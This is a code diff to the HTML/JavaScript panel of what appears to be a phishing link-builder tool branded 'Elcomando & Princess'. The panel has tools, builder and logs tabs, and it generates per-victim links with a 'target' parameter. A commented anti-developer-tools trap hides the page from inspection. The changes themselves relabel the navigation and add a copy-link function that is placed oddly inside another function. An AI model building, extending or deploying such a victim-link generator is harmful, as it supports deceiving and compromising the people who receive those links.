@@ -151,7 +151,7 @@
                 </div>
                 <div style="margin-top: 20px; text-align: center;">
                     <p id="tool-link-display" style="font-size: 10px; color: var(--primary); word-break: break-all; margin-bottom: 10px;"></p>
-                    <button class="btn btn-neon" id="copy-tool-btn">Welcome TO WORLD CMD</button>
+                    <button class="btn btn-neon" id="copy-tool-btn">Welcome TO WORLD CMD🎁</button>
                     <button class="btn" style="margin-top: 10px; background: #222; color: #fff;" onclick="nav(1, 'LINKS', '🔗', null)">BACK 🔙</button>
                 </div>
             </div>
@@ -190,10 +190,10 @@
         </div>
 
         <nav class="bottom-nav">
-            <div class="nav-item active" onclick="nav(1, 'LINKS', '🔗', this)"><i class="fas fa-link"></i><br><span>الروابط</span></div>
-            <div class="nav-item" onclick="nav(2, 'BUILDER', '🛠️', this)"><i class="fas fa-hammer"></i><br><span>الإنشاء</span></div>
-            <div class="nav-item" onclick="nav(3, 'LOGS', '🔔', this)"><i class="fas fa-bell"></i><br><span>تنبيهات</span></div>
-            <div class="nav-item" onclick="nav(4, 'PROFILE', '⚙️', this)"><i class="fas fa-user-shield"></i><br><span>بروفايل</span></div>
+            <div class="nav-item active" onclick="nav(1, 'LINKS-Elcomando & Princess', '🔗', this)"><i class="fas fa-link"></i><br><span>TOOLS</span></div>
+            <div class="nav-item" onclick="nav(2, 'BUILDER-Elcomando & Princess', '🛠️', this)"><i class="fas fa-hammer"></i><br><span>BUILDER</span></div>
+            <div class="nav-item" onclick="nav(3, 'LOGS-Elcomando & Princess', '🔔', this)"><i class="fas fa-bell"></i><br><span>LOGS</span></div>
+            <div class="nav-item" onclick="nav(4, 'PROFILE', '⚙️', this)"><i class="fas fa-user-shield"></i><br><span>PROFILE</span></div>
         </nav>
     </div>
 
@@ -401,6 +401,27 @@ function generateCustomLink() {
         // السطر ده هيعرف لوحده اسم الموقع اللي مرفوع عليه ويضيف اسم الأداة
 const baseUrl = window.location.origin; 
 const link = `${baseUrl}/${tool}.html?user_id=${finalId}&target=${vict}`;
+
+function copyGeneratedLink() {
+    const linkText = document.getElementById('final-link').innerText;
+    if (!linkText) return;
+
+    navigator.clipboard.writeText(linkText).then(() => {
+        const copyBtn = event.currentTarget;
+        const originalHTML = copyBtn.innerHTML;
+        
+        copyBtn.innerHTML = 'COPIED ✅';
+        copyBtn.style.color = '#00ff00';
+        
+        setTimeout(() => {
+            copyBtn.innerHTML = originalHTML;
+            copyBtn.style.color = 'var(--primary)';
+        }, 2000);
+    }).catch(err => {
+        alert("فشل النسخ، انسخه يدوياً: " + linkText);
+    });
+}
+
         
         
        // فخ بسيط لإغلاق الصفحة إذا تم فتح أدوات المطور
@@ -423,4 +444,3 @@ document.onkeydown = (e) => {
     </script>
 </body>
 </html>
-
